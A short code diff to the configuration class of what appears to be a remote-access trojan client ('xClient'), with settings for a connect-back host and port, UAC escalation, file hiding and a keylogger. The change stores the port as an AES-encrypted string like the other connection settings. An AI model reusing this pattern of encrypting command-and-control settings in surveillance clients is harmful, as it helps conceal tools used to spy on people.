@@ -11,7 +11,6 @@ namespace xClient.Config
 #if DEBUG
         public static string VERSION = "1.0.0.0d";
         public static string HOST = "localhost";
-        public static ushort PORT = 4782;
         public static int RECONNECTDELAY = 5000;
         public static string PASSWORD = "1234";
         public static string DIR = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
@@ -24,6 +23,7 @@ namespace xClient.Config
         public static bool HIDEFILE = false;
         public static bool ENABLEUACESCALATION = false;
         public static bool ENABLELOGGER = true;
+        public static string PORT = "4782";
 
         public static void Initialize()
         {
@@ -31,7 +31,6 @@ namespace xClient.Config
 #else
         public static string VERSION = "1.0.0.0r";
         public static string HOST = "localhost";
-        public static ushort PORT = 4782;
         public static int RECONNECTDELAY = 5000;
         public static string PASSWORD = "1234";
         public static string DIR = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
@@ -45,11 +44,13 @@ namespace xClient.Config
         public static bool ENABLEUACESCALATION = true;
         public static bool ENABLELOGGER = true;
         public static string ENCRYPTIONKEY = "ENCKEY";
+        public static string PORT = "4782";
 
         public static void Initialize()
         {
             VERSION = AES.Decrypt(VERSION, ENCRYPTIONKEY);
             HOST = AES.Decrypt(HOST, ENCRYPTIONKEY);
+            PORT = AES.Decrypt(PORT, ENCRYPTIONKEY);
             PASSWORD = AES.Decrypt(PASSWORD, ENCRYPTIONKEY);
             SUBFOLDER = AES.Decrypt(SUBFOLDER, ENCRYPTIONKEY);
             INSTALLNAME = AES.Decrypt(INSTALLNAME, ENCRYPTIONKEY);
